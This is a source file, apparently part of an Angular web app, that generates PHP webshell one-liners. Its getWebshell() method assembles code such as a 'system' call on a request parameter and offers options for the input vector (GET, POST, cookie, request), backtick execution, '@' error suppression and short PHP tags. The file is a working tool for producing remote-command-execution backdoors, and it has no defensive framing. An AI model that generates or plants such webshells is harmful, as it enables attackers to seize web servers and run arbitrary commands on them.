import { Component, OnInit } from '@angular/core';
import {Webshell} from '../webshell';

@Component({
  selector: 'app-editor',
  templateUrl: './editor.component.html',
  styleUrls: ['./editor.component.scss']
})
export class EditorComponent implements OnInit {
  availableVectors = [
    '_REQUEST',
    '_GET',
    '_POST',
    '_COOKIE',
  ];
  webshell: Webshell = {
    ignoreErrors: false,
    shortEchoTags: false,
    shortTags: false,
    vectorFunction: "system",
    vector: "_REQUEST",
    paramName: "x",
  };

  getWebshell() {
    // Start PHP tag
    let result = this.webshell.shortTags ? (this.webshell.shortEchoTags ? '<?=' : '<?') : '<?php';

    // Ignore errors
    result += this.webshell.ignoreErrors ? '@' : (this.webshell.shortTags || this.webshell.vectorFunction === '`' ? '' : ' ');

    // Vector function
    result += this.webshell.vectorFunction === '`' ? '`' : `${this.webshell.vectorFunction}(`;

    // Get payload from vector
    result += `$${this.webshell.vector}["${this.webshell.paramName}"]`;

    // Close vector function call
    result += this.webshell.vectorFunction === '`' ? '`' : `);`;

    // Close PHP tag
    result += '?>';

    return result;
  }

  constructor() {}

  ngOnInit(): void {
  }

  setShortTags(value: boolean): void {
    this.webshell.shortTags = value;
  }

}
